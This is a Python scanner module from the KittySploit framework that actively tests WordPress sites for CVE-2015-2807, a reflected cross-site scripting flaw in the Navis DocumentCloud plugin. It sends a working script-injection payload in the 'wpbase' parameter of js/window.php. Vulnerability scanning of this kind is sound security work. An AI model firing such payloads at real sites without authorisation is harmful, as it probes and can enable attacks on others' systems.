#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Navis DocumentCloud plugin before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Navis DocumentCloud <0.1.1 - Cross-Site Scripting Detection',
        'description': 'Navis DocumentCloud plugin before 0.1.1 for WordPress contains a reflected cross-site scripting vulnerability in js/window.php which allows remote attackers to inject arbitrary web script or HTML via the wpbase parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2015', 'cve', 'wordpress', 'wp-plugin', 'xss', 'documentcloud', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://advisories.dxw.com/advisories/publicly-exploitable-xss-in-wordpress-plugin-navis-documentcloud/',
            'https://security.dxw.com/advisories/publicly-exploitable-xss-in-wordpress-plugin-navis-documentcloud/',
            'https://wordpress.org/plugins/navis-documentcloud/changelog/',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2807',
            'https://wpvulndb.com/vulnerabilities/8164',
        ],
        'cve': 'CVE-2015-2807',
    }

    def run(self):
        path = '/wp-content/plugins/navis-documentcloud/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Navis', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/navis-documentcloud/js/window.php?wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Navis DocumentCloud <0.1.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

